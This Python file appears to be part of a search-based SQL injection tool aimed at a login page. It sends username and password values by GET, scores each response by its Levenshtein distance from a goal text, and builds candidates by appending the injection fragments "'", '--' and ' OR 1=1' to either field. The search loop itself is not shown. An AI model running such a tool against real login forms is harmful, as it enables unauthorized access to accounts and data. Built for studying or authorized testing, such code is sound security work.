import requests
from bs4 import BeautifulSoup
from Levenshtein import distance as levenshtein_distance

# determines that path cost using the combined length. This helps to optimize for less iterations
def path_cost(username, password):
    return len(username) + len(password)

# calculates the heuristic cost based on the response of GET /login and its levenshtein distance from the goal_text
def heuristic_cost(url, username, password, goal_text):
    inputs = {'username': username, 'password': password}

    try:
        response = requests.get(url, params=inputs)
        soup = BeautifulSoup(response.text, 'html.parser')
        page_text = soup.get_text()

    except requests.exceptions.RequestException as e:
        print(f"Received request exception: {e}")
        page_text = e

    if goal_text in page_text:
        return 0

    return levenshtein_distance(goal_text, page_text)

# generates mutations to get closer to an SQL injection
def generate_mutations(username, password):
    # Respectively, mutations are:
    # append a quote
    # append a sql comment
    # append sql
    mutations = ["'", "--", " OR 1=1"]
    generated_mutations = []

    for mutation in mutations:
        generated_mutations.append((username + mutation, password))
        generated_mutations.append((username, password + mutation))

    return generated_mutations
